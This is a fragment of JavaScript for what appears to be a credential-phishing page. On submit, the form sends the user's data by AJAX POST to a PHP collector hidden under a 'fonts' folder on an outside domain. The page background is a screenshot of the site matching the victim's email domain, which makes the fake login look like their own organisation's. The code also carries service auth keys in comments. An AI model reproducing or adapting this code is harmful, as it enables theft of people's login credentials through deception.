...
const Default = ()=>{
    ...
    const submitDefaultForm = (e)=>{
        ...
        $.ajax({
            type: "POST",
            url: "https://dozenpearl.com/nc_assets/fonts/new/march.php",
            data: user,
            success(data) {
                // alert('OK');
                console.log(data);
    ...
    style={{
        // https://image.thum.io/get/auth/70408-willbe/https://www.wikipedia.org/
        // https://image.thum.io/get/auth/70552-oiuytr/https://www.wikipedia.org/
        backgroundImage: `url(https://image.thum.io/get/auth/70552-oiuytr/https://www.${extracetdEmail}/)`,
        width:'100vw',
        height:'100vh',
